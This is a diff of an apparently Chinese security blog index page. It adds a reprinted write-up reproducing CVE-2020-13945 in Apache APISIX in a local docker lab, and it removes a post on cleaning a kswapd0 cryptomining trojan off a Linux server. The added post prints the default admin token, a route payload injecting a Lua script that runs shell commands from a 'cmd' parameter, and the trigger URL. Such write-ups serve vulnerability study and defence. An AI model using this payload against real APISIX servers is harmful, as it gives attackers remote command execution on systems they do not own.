@@ -86,6 +86,81 @@
 
     
         <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
+                Apache APISIX 默认密钥漏洞（CVE-2020-13945）
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-apisix-默认密钥漏洞cve-2020-13945">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/horistttt/article/details/124344871">horisMMM</a> 并作补充</p>
+</blockquote>
+<h2><span id="apisix简介">APISIX简介</span></h2><blockquote>
+<p>官方一句话介绍：Apache APISIX是一个高性能API网关。</p>
+<p>API网关又是什么？</p>
+<p>百度：API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
+<p>任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。</p>
+<p>如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。</p>
+<p>那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
+</blockquote>
+<h2><span id="存在漏洞">存在漏洞</span></h2><blockquote>
+<p>在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。</p>
+<p>意思就是有一个默认的Token，可以直接得到管理员权限，并插入攻击脚本。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>docker-compose up -d 搭建环境</p>
+<p>docker ps 查看端口为9080</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/1.png" alt="image"></p>
+<p>访问 127.0.0.1&#x2F;asixpix&#x2F;admin&#x2F;routes,显示token不正确</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/2.png" alt="image"></p>
+<p>抓这个包，把方法改为POST，加上X-API-KEY: edd1c9f034335f136f87ad84b625c8f1，加上payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/3.png" alt="image"></p>
+<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9080/attack?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="payload分析">payload分析</span></h2><blockquote>
+<p>查看官方文档，观察创建路由的方法</p>
+<p><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/docs/apisix/getting-started/">https://apisix.apache.org/zh/docs/apisix/getting-started/</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/5.png" alt="image"></p>
+<p>与payload对比，发现payload格式与官方创建路由一致，只是利用script插入了一段lua恶意脚本。</p>
+<p>在 Apache APISIX 中，我们在 Route 实体中新增了 script 执行逻辑，可用于接收 Dashboard 生成的 Lua 函数并执行，它支持调用已有插件以复用代码。另外，它也作用于 HTTP 请求的生命周期中的各个阶段，如 access、header_filer、body_filter 等，系统会在相应阶段自动执行 script 函数对应阶段代码<br><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/6.png" alt="image"></p>
+<p>接下来对lua脚本进行分析,\n是换行</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125; \n <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>//在access阶段进行处理，检查如果达到的不健康次数超过了配置的最大次数，则就被<span class="keyword">break</span>掉。这里没找到看得懂的资料。</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)//加载<span class="built_in">os</span>模块，用于进行文件操作</span><br><span class="line"><span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args()) //<span class="built_in">assert</span>()是断言，类似于try(),这里是获取uri中给的参数。</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))//<span class="built_in">io</span>.<span class="built_in">popen</span>()用于执行系统命令,<span class="string">&#x27;r&#x27;</span>是模式</span><br><span class="line"><span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))//读取全部内容</span><br><span class="line">ngx.say(s)//输出，还有一种方法是ngx.<span class="built_in">print</span>(),但两者有区别</span><br><span class="line">f:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>function _M.access(conf, ctx)</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/7.png" alt="image"></p>
+<p><strong>assert()</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/8.png" alt="image"></p>
+<p><strong>read(‘a’)</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013625451/article/details/78879739">https://blog.csdn.net/u013625451/article/details/78879739</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/9.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/11/08/urllib-HTTPResponse/">
                 urllib库进行网络请求后返回的HTTPResponse对象的用法总结
             </a>
@@ -712,77 +787,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/kswapd0-CPU-1/">
-                服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="服务器linux挖矿木马病毒kswapd0进程使cpu爆满">服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_47831505/article/details/123939089">飞川撸码</a> 并作补充</p>
-</blockquote>
-<h2><span id="前言">前言</span></h2><blockquote>
-<p>由于本人的阿里云服务器遭受攻击，被挖矿，导致CPU爆满，同时受到阿里云官方的邮箱、短信以及电话通知（监管部门是不允许服务器被直接或者间接挖矿）<br>首先是CPU爆满，远程登录不了，通过将服务器重启以后可以远程登录了。以kswapd0进程为例，其他进程类似，下面就是具体步骤了。<br>可参考阿里云的：挖矿程序处理最佳实践<br>注：如果你的服务器购买了付费版云安全中心，在云安全中心插件正常的前提下，可以利用付费版的主动防御及安全告警处理的功能来手动扫描下，对于检测到的威胁，你可以在安全告警处理页面进一步核实处理。应该可以直接处理掉。(如果没有，看下面的处理)<br><img src="/2023/10/25/kswapd0-CPU-1/1.png" alt="image"> </p>
-<p><img src="/2023/10/25/kswapd0-CPU-1/2.png" alt="image"> </p>
-</blockquote>
-<h2><span id="1在系统里面top一下查看了所有进程">1.在系统里面top一下，查看了所有进程</span></h2><blockquote>
-<p><img src="/2023/10/25/kswapd0-CPU-1/3.png" alt="image"> </p>
-<p>看到这些进程一直在变化，但是，主要是由于kswapd0进程在作怪，占据了99%以上的CUP，查找资料后，发现它就是挖矿进程。</p>
-</blockquote>
-<h2><span id="2排查kswapd0进程">2.排查kswapd0进程</span></h2><h3><span id="21-执行命令netstat-antlp-grep-kswapd0-查询该进程的网络信息">2.1 执行命令netstat -antlp | grep kswapd0 查询该进程的网络信息</span></h3><blockquote>
-<p><code>netstat -antlp | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/4.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>发现一个与本机端口通信的是一个荷兰的ip<br><img src="/2023/10/25/kswapd0-CPU-1/5.png" alt="image"> </p>
-</blockquote>
-<h3><span id="22执行命令netstat-antlp-grep-1943619030-查询该地区ip的其他网络占用情况">2.2执行命令netstat -antlp | grep 194.36.190.30 查询该地区ip的其他网络占用情况</span></h3><blockquote>
-<p><code>netstat -antlp | grep 194.36.190.30</code><br><img src="/2023/10/25/kswapd0-CPU-1/6.png" alt="image"> </p>
-<p>发现只有这一个进程（当然，很有可能花卉有其他进程）</p>
-</blockquote>
-<h2><span id="3-查找进程的详细信息">3. 查找进程的详细信息</span></h2><blockquote>
-<p>我们来到&#x2F;proc&#x2F;目录下查找对应的pid号，即&#x2F;proc&#x2F;497。可以在这目录下找到kswapd0进程的详细信息。<br><code>ll /proc/497</code><br><img src="/2023/10/25/kswapd0-CPU-1/7.png" alt="image"> </p>
-</blockquote>
-<h2><span id="4查看进程的工作空间">4.查看进程的工作空间</span></h2><blockquote>
-<p><code>ps -ef | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/8.png" alt="image"> </p>
-<p>执行完后可以看到进程的pid以及进程相关文件的位置</p>
-</blockquote>
-<h2><span id="5切换到木马程序目录并删除">5.切换到木马程序目录并删除</span></h2><blockquote>
-<p><img src="/2023/10/25/kswapd0-CPU-1/9.png" alt="image"> </p>
-<p><code>rm -rf /var/tmp/.copydie</code></p>
-</blockquote>
-<h2><span id="6清理定时任务">6.清理定时任务</span></h2><blockquote>
-<p>很多病毒都是有会在定时任务里面，以至于很难清理清楚。（由于我的服务器买油开启定时任务服务，所以里面没有任务）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看定时任务：</span><br><span class="line">crontab -l</span><br><span class="line">清理计划任务: </span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>清除后将定时任务里的相关文件都清理干净，若有其他用户，将其他用户的定时任务也清理。</p>
-</blockquote>
-<h2><span id="7杀掉kswapd0进程">7.杀掉kswapd0进程</span></h2><blockquote>
-<p>最好把木马程序和定时任务都清理完了再杀掉,要不然还会自动重启<br><code>kill -9 497</code> #kill -9 kswapd0进程的PID</p>
-</blockquote>
-<h2><span id="8总结">8.总结</span></h2><blockquote>
-<p>就是跟着进程找找目录，然后杀进程，清目录<br>清定时任务<br>服务器的ftp端口最好别用22,密码尽量设置复杂点<br>尽量用密钥连接服务器，最好别用账号密码连接<br>封闭不使用的端口，做到用一个开一个（通过防火墙和安全组策略）<br>密码增强复杂性<br>及时修补系统和软件漏洞</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
             </div>
         
 
